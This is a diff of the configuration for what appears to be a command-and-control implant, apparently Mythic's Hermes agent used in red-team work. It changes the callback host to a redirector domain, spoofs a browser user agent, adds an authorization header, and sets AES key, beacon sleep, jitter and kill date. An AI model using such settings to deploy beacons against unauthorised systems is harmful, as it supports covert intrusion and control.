@@ -30,20 +30,20 @@ struct AgentConfig {
 }
 
 var agentConfig = AgentConfig(
-    payloadUUID: "23128e17-9ae1-4807-ae87-579cfc6fbb00",
-    encodedAESKey: "QjzB8Bg7yI+j1aLLtMJYQUzltpVPvAUQId8vw2T2o6g=",
-
-    callbackHost: "192.168.196.129",
-    getRequestURI: "/index",
-    postRequestURI: "/data",
+    payloadUUID: "86884592-40e0-413f-aee9-a93accd8bb96",
+    encodedAESKey: "8SNeOPWj3Q384MRJZ+M0PlZ0Q1dq1X6unNbdRRextzg=",
+    
+    callbackHost: "redirector-test.polarbear.dev",
+    getRequestURI: "/get",
+    postRequestURI: "/post",
     callbackPort: 443,
-    userAgent: "Hermes user agent",
+    userAgent: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
     hostHeader: "",
     useSSL: true,
     queryParameter: "q",
-    httpHeaders: ["key1":"value1","key2":"value2"],
-
-    sleep: 5,
-    jitter: 5,
-    killDate: "2024-05-01"
+    httpHeaders: ["Authorization":"SnowflakeRedTeam"],
+    
+    sleep: 10,
+    jitter: 23,
+    killDate: "2025-02-05"
 )
